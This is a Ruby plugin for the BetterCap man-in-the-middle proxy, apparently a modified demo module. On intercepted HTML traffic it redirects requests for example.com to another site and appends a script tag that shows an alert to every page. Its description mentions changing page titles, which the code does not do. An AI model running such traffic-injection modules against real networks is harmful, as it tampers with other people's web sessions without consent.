class HackTitle < BetterCap::Proxy::HTTP::Module
  meta(
    'Name'        => 'HackTitle',
    'Description' => 'Adds a "!!! HACKED !!!" string to every webpage title.',
    'Version'     => '1.0.0',
    'Author'      => "Simone 'evilsocket' Margaritelli",
    'License'     => 'GPL3'
  )
  
  # called before the request is performed
  def on_pre_request( request ); end

  # this method is called after the request is performed
  def on_request( request, response )
  
    
    BetterCap::Logger.info "Hacking http://#{request.host}"
    # is it a html page?
    if response.content_type =~ /^text\/html.*/
    
      if request.host =~ /example.com.*/
        response.redirect!("https://webtwob.de")
     
      
     
        #found = false
        #BetterCap::Logger.info "Redirecting"
        #for h in response.headers
        #  if h.include?("Location:")
        #    found = true
        #    if !h.include?("https://webtwob.de")
        #      h.replace("Location: http://webtwob.de")
        #    end
        #  end
        #end
        
        #if !found 
        #  BetterCap::Logger.info "No Location header found, adding one."
        #  # Replace HTTP Response code with 302
        #  response.headers.
        #  # This is an ugly hack to get around github issue #117
        #  response.headers.reject! { |header| header.empty? }
        #  # This is our payload line that is fine
        #  response.headers << "Location: https://webtwob.de"
        #  # This line is also necessary because of github issue #117
        #  response.headers << ""
        # 
        #end
      end
      
    
      #BetterCap::Logger.info "Hacking http://#{request.host}#{request.url}"
      # make sure to use sub! or gsub! to update the instance
      response.body.sub!( '</body>', ' <script> alert(42); </script> </body>' )
    end
  end
end
